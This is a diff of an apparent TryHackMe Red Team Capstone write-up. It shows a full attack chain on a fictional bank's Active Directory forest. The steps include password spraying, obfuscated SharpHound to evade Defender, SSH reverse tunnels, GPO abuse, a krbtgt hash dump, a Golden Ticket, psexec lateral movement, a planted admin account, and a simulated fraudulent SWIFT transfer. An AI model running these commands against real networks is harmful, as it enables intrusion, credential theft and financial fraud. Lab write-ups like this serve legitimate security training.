-**SMB         10.200.113.21   445    WRK1             [+] corp.thereserve.loc\svcScanning:Password1!** 
+$ crackmapexec smb 10.200.x.21 -u All_users.txt -p valid_passwords --continue-on-success
+**SMB         10.200.x.21   445    WRK1             [+] corp.thereserve.loc\svcScanning:Password1!** 
 ```
-#### **BloodHound**
+### **BloodHound**
 After we have pawned this user, let’s gather more info about it so we can identify how we are going to use it further.
 ```powershell
 PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcScanning
@@ -1244,7 +1256,9 @@ objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=lo
 ```
 I think this manual enumeration will be a bit difficult. Let’s try bloodhound to gain a better view.
 As our compromised workstations have Windows Defender enabled, we have to find a way to run Sharphound script to get our loot.
+
 **AV Evasion**
+
 Found an obfuscated version of Sharphound that worked with me in this repo:
 [GitHub - Flangvik/ObfuscatedSharpCollection](https://github.com/Flangvik/ObfuscatedSharpCollection/tree/main)
 ```powershell
@@ -1284,8 +1298,10 @@ As we have recently compromised the SvcScanning user via a kerberoasting attack,
 
 GREAAAT! It seems that the svcScanning user is a member of the `services@corp.thereserve.loc` and has the permission to execute remote PowerShell commands on the `server2.corp.thereserve.loc` computer.
 
-### **SERVER2 Machine**
-#### **Foothold**
+### **Gainning Foothold**
+
+**From SERVER2 Machine**
+
 **PowerShell Remote**
 ```powershell
 PS C:\Users\mohammad.ahmed> $Secpass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
@@ -1308,16 +1324,16 @@ SERVER2
 ```
 Now we have access to a `server2.corp.thereserve.loc` computer. But unfortunately, we don’t have direct access from our attacker machine to SERVER1 or SERVER2. So we need to establish port forwarding to ease the process of exploitation and privilege escalation.
 
-#### **Dynamic Port Forwarding**
+### **Dynamic Port Forwarding**
 As we have ssh enabled on WRK1 and WRK2 machines, let’s create a secure tunnel via SSH using the dynamic port forwarding method.
 ```powershell
 # On WRK1 Machine
-PS C:\Users\mohammad.ahmed> ssh tunneluser@12.100.1.9 -R 9050 -N
-The authenticity of host '12.100.1.9 (12.100.1.9)' can't be established.
+PS C:\Users\mohammad.ahmed> ssh tunneluser@12.100.1.x -R 9050 -N
+The authenticity of host '12.100.1.x (12.100.1.x)' can't be established.
 ECDSA key fingerprint is SHA256:vy8coHY0geP5OZvyw+zTPNkk9edAkZVP6DZxa7hSuls.
 Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '12.100.1.9' (ECDSA) to the list of known hosts.
-tunneluser@12.100.1.9's password:
+Warning: Permanently added '12.100.1.x' (ECDSA) to the list of known hosts.
+tunneluser@12.100.1.x's password:
 ```
 ```bash
 # On My Attacking Machine
@@ -1327,7 +1343,7 @@ Proto Recv-Q Send-Q Local Address           Foreign Address         State       
 tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      off (0.00/0/0)
 tcp6       0      0 ::1:9050                :::*                    LISTEN      off (0.00/0/0)
 
-$ proxychains -q evil-winrm -i  10.200.89.32 -u svcScanning -p 'Password1!'
+$ proxychains -q evil-winrm -i  10.200.x.32 -u svcScanning -p 'Password1!'
 
 Evil-WinRM shell v3.4
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
@@ -1344,8 +1360,10 @@ We are now able to obtain the following flags:
 - ***Flag 6, Administrative access to Corporate Division Tier 1 Infrastructure***
 
 ## **Full Compromise of CORP Domain**
-### **SERVER2 Machine**
-#### **Exploiting GPO GenericWrite**
+### **Exploiting GPO GenericWrite**
+
+**FROM SERVER2 Machine**
+
 Since we got access to SERVER1 and SERVER2, let’s execute the attack vector that was suggested by Bloodhound.
 ![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)
 
@@ -1395,14 +1413,18 @@ Global Group memberships     *Domain Controllers   *Domain Users
 The command completed successfully.
 ```
 Woo! Now we can RDP to the DC machine, and we are now Domain Admins and OWN the whole Domain. We are now able to obtain the following flag:
+
 ***- Flag-7: Foothold on Corporate Division Tier 0 Infrastructure***
+
 ***- Flag-8: Administrative access to Corporate Division Tier 0 Infrastructure***
 
 ![Untitled](/assets/N-RedTeamCC/d9ab914b-c1ac-4de2-a2f7-8efa8b2c5ede.png)
 
 ## **Full Compromise of ROOTDC**
-### **CORPDC Machine**
-#### **Enumeration**
+### **Enumeration**
+
+**From CORPDC Machine**
+
 Now we are part of the domain admins group and we own a child domain inside the whole forest. So let’s enumerate some information about the forest and the domain trust.
 
 ```powershell
@@ -1449,7 +1471,7 @@ Let’s simplify it with the following diagram:
 
 As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain also, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.
 
-#### **Exploiting Transitive Trust**
+### **Exploiting Transitive Trust**
 A Golden Ticket attack is a way of creating a forged TGT with a stolen KDC key, which enables us to gain access to any service on the domain, essentially becoming our own Ticket Granting Server (TGS). In order to perform a Golden Ticket attack, we will need the following information:
 
 - The Full Qualified Domain Name (FQDN) of the Domain
@@ -1465,7 +1487,7 @@ So, we also need the following information in order to craft our Golden Ticket:
 
 ```powershell
 # Getting KRBTGT Hash 
-$ proxychains -q impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.89.102
+$ proxychains -q impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.x.102
 Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
 
@@ -1528,7 +1550,7 @@ C:\Windows\system32>dir \\rootdc.thereserve.loc\c$
                6 Dir(s)  22,418,341,888 bytes free
 ```
 
-#### **Lateral Movement**
+### **Lateral Movement**
 As our golden ticket is loaded into memory, and we have access to the ROOTDC machine, we need to perform lateral movement and establish a shell on this machine. A simple way would be by running psexec remotely on the ROOTDC machine.
 ```powershell
 PS C:\Users\svcScanning\Desktop> .\psexec.exe \\ROOTDC.thereverse.loc cmd.exe
@@ -1565,8 +1587,10 @@ We are now able to obtain the following flags:
 - ***Flag 16, Administrative access to Parent Domain***
 
 ## **Full Compromise of BANK Domain**
-### **ROOTDC Machine**
-#### **Persistence**
+### **Persistence**
+
+**From ROOTDC Machine**
+
 Great, we have a fully interactive shell, let’s create our own user and add it to the enterprise admin group.
 ```powershell
 C:\Users\Administrator.CORP>net user ItsFadinG "Password1!" /domain
@@ -1576,7 +1600,7 @@ The command completed successfully.
 
 # Connecting from Attacking Machine
 ┌──(root㉿kali)-[~]
-└─$ proxychains -q evil-winrm -i 10.200.89.100 -u ItsFadinG -p 'Password1!'                           
+└─$ proxychains -q evil-winrm -i 10.200.x.100 -u ItsFadinG -p 'Password1!'                           
 
 Evil-WinRM shell v3.4
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
@@ -1586,13 +1610,13 @@ Info: Establishing connection to remote endpoint
 ROOTDC
 ```
 
-#### **Port Forwarding**
+### **Port Forwarding**
 We are now having access to the ROOTDC therefore, from here we can access the child domain BANK.thereverse.loc but we can’t access it directly from our own attacking machine. Therefore, we need to establish tunneling from the ROOTDC. We are assigned two interfaces, one for the tryhackme VPN and the other for the Corp VPN, from that, we previously accessed the internal network.
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC/proxychains]
 └─$ ifconfig     
 tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
-        inet **10.50.87.39**  netmask 255.255.255.0  destination 10.50.87.39
+        inet 10.50.87.39  netmask 255.255.255.0  destination 10.50.87.39
         inet6 fe80::4eaf:39ba:b250:d638  prefixlen 64  scopeid 0x20<link>
         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
         RX packets 1211  bytes 692035 (675.8 KiB)
@@ -1601,7 +1625,7 @@ tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
 tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
-        inet **12.100.1.8**  netmask 255.255.255.0  destination 12.100.1.8
+        inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
         inet6 fe80::90f7:43f8:282d:b3f8  prefixlen 64  scopeid 0x20<link>
         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
         RX packets 1548  bytes 457422 (446.7 KiB)
@@ -1612,8 +1636,8 @@ tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
 Let’s check which IP is reachable from the ROOTDC.
 ```powershell
 # Corp VPN
-*Evil-WinRM* PS C:\Users\ItsFadinG\Documents> ping 12.100.1.8
-Pinging 12.100.1.8 with 32 bytes of data:
+*Evil-WinRM* PS C:\Users\ItsFadinG\Documents> ping 12.100.1.x
+Pinging 12.100.1.x with 32 bytes of data:
 Request timed out.
 
 # Tryhackme VPN
@@ -1630,8 +1654,8 @@ tunneluser@10.50.87.39's password:
 Let’s RDP to it and check.
 ```bash
 ┌──(root㉿kali)-[/]
-└─$ proxychains -q -f proxychains4.conf xfreerdp /u:ItsFadinG /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.101            
-[13:26:48:054] [902989:902999] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: **STATUS_LOGON_FAILURE** [0xC000006D] from server
+└─$ proxychains -q -f proxychains4.conf xfreerdp /u:ItsFadinG /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101            
+[13:26:48:054] [902989:902999] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
 [13:26:48:054] [902989:902999] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
 [13:26:48:054] [902989:902999] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
 [13:26:48:054] [902989:902999] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
@@ -1650,7 +1674,7 @@ Connecting again with the administrator user:
 # the first is tunneling traffic from the WKR1 or WRK2 to my attacking machine giving me direct access to the SERVERs and DC
 # The other one from the ROOTDC to my attacking machine giving me direct access to the bank.thereveres.loc child domain
 ┌──(root㉿kali)-[/tmp/aaa]
-└─$ proxychains -q -f proxychains4.conf xfreerdp /u:Administrator /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.101  
+└─$ proxychains -q -f proxychains4.conf xfreerdp /u:Administrator /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101  
 ```
 ![Untitled](/assets/N-RedTeamCC/Untitled%2018.png)
 
@@ -1669,8 +1693,10 @@ Since we have an administrator account then all child domains are owned now and 
 ![Untitled](/assets/N-RedTeamCC/Untitled%2019.png)
 
 ## **Compromise of SWIFT and Payment Transfer**
-### **BANKDC Machine**
-#### **Enumeration**
+### **Enumeration**
+
+**From BANKDC Machine**
+
 Let’s create our own user and enumerate the groups:
 ```powershell
 PS C:\Users\Administrator> net user ItsFadinG "adeladel22!" /domain /add
@@ -1709,20 +1735,19 @@ PS C:\Users\Administrator> net group "Payment Capturers" /add ItsFadinG /domain
 The command completed successfully.
 ```
 Now that we have owned all the machines, let’s review our Project Goal:
-```txt
-the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure. However, the SWIFT backend exposes an internal web application at [http://swift.bank.thereserve.loc/,](http://swift.bank.thereserve.loc/,) which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds: 
-1. A customer makes a request that funds should be transferred and receives a transfer code.
-2. The customer contacts the bank and provides this transfer code.
-3. An employee with the capturer role authenticates to the SWIFT application and *captures* the transfer.
-4. An employee with the approver role reviews the transfer details and, if verified, *approves* the transfer. This has to be performed from a jump host.
-5. Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified. Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.
-```
+> the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of > the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure. However, the SWIFT backend exposes an internal web application at [http://swift.bank.thereserve.loc/,](http://swift.bank.thereserve.loc/,) which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds: 
+>> 1. A customer makes a request that funds should be transferred and receives a transfer code.
+>> 2. The customer contacts the bank and provides this transfer code.
+>> 3. An employee with the capturer role authenticates to the SWIFT application and *captures* the transfer.
+>> 4. An employee with the approver role reviews the transfer details and, if verified, *approves* the transfer. This has to be performed from a jump host.
+>> 5. Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified. Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.
+
 So what we need is to access the SWIFT web application, perform a transaction and have the ability to capture it and approve it. As the diagram of this network suggests, the SWIFT machine can be accessed only from the JMP machine.
 
-### **JMP Machine**
-#### **Enumeration**
+**From JMP Machine**
+
 ```bash
-$ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:ItsFadinG /p:'adeladel22!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.61
+$ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:ItsFadinG /p:'adeladel22!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.61
 [13:43:25:568] [1073491:1073501] [ERROR][com.winpr.timezone] - Unable to get current timezone rule
 [13:43:25:082] [1073491:1073501] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
 [13:43:25:082] [1073491:1073501] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
@@ -1738,7 +1763,7 @@ JMP
 Let’s access the SWIFT web application:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2020.png)
 
-#### **Dynamic Port Forwarding**
+### **Dynamic Port Forwarding**
 For better application inspection with Burp Suite, we could use Dynamic port forwarding to access this Swift web app from our attacking machine.
 ```bash
 PS C:\Users\ItsFadinG> ssh tunneluser@10.50.87.39 -R 9070 -N
@@ -1749,8 +1774,8 @@ Warning: Permanently added '10.50.87.39' (ECDSA) to the list of known hosts.
 tunneluser@10.50.87.39's password:
 ```
 
-#### **Access to SWIFT application**
-Now we can gain flag 17 ***"Access to SWIFT application"  let’s see the instructions***
+### **Access to SWIFT application**
+Now we can gain  ***flag 17, Access to SWIFT application"***  let’s see the instructions:
 ```bash
 In order to proof that you have access to the SWIFT system, dummy accounts have been created for you and you will have to perform the following steps to prove access.
 ===============================================
@@ -1783,7 +1808,7 @@ We have received flag 17, but after that we have received an important email:
 
 As stated, we need to have a capturer and approver account to be able to create our own transfer from start to finish and show impact.
 
-#### **SWIFT Capturer and Capturer Access**
+### **SWIFT Capturer and Capturer Access**
 If you remember from our previous enumeration, we have found two interesting groups and added our users to them **( Payment Approvers - Payment Capturers ).** Let’s try to log in to the application using our domain username:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2024.png)
 
@@ -1823,7 +1848,7 @@ Hmm! This suggests that some users may be using different credentials for the SW
 ```bash
 # Filtering for users that are only part of the Payment Approvers and Payment Capturers groups
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ proxychains -f proxychains/proxychains_ROOTDC_To_BANKDC.conf -q impacket-secretsdump bank.thereserve.loc/ItsFadinG:'adeladel22!'@10.200.89.101
+└─$ proxychains -f proxychains/proxychains_ROOTDC_To_BANKDC.conf -q impacket-secretsdump bank.thereserve.loc/ItsFadinG:'adeladel22!'@10.200.x.101
 Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
@@ -1853,7 +1878,9 @@ let’s try to access the SWIFT web app with these creds only the **c.young** us
 ![Untitled](/assets/N-RedTeamCC/Untitled%2026.png)
 
 Now we can submit:
+
 - ***Flag-18: Access to SWIFT application as capturer***
+  
 ```bash
 In order to proof that you have capturer access to the SWIFT system, a dummy transaction has been created for you.
 
@@ -1864,12 +1891,13 @@ TO:     66a23d8e984e4a04f6a2e06d
 
 Look for this transfer and capture (forward) the transaction.
 ```
+
 ![Untitled](/assets/N-RedTeamCC/Untitled%2027.png)
 
 Click forward, and we have received our flag! Now we need to get access to an Approver account. Since we have cracked three accounts, one of which is only part of the Payment Approvers group, let’s connect to the JMP machine using a.turner user.
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC\proxychains]
-└─$ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:a.turner /p:'Password!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.61
+└─$ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:a.turner /p:'Password!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.61
 [15:07:47:271] [1114772:1114790] [ERROR][com.winpr.timezone] - Unable to get current timezone rule
 [15:07:47:885] [1114772:1114790] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
 [15:07:47:885] [1114772:1114790] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
@@ -1882,6 +1910,7 @@ Surprise! It seems that Alison Turner has a bad memory, he has saved his passwor
 ![Untitled](/assets/N-RedTeamCC/Untitled%2028.png)
 
 let’s submit ***Flag-19: Access to SWIFT application as approver***
+
 ```bash
 In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created for you.
 
@@ -1894,7 +1923,7 @@ Look for this transfer and approve (forward) the transaction.
 ```
 ![Untitled](/assets/N-RedTeamCC/Untitled%2029.png)
 
-#### **SWIFT Simulated Fraudulent Transfer**
+### **SWIFT Simulated Fraudulent Transfer**
 We are one step away from our final goal and the last flag, ***Flag-20: Simulated fraudulent transfer made***.
 ```bash
 This is the final check! Please do not attempt this if you haven't completed all of the other flags.
@@ -1906,14 +1935,17 @@ Once done, follow these steps:
 5. Profit?
 ```
 **Verifying The Transaction**
+
 from `ItsFadinG@destination.loc` email
 ![Untitled](/assets/N-RedTeamCC/Untitled%2030.png)
 
 **Capture the Verified Transaction**
+
 from  `c.young@bank.thereserve.loc` email:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2031.png)
 
 **Approve The Captured Transaction**
+
 from the `a.turner@bank.thereserve.loc` email:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2032.png)
 
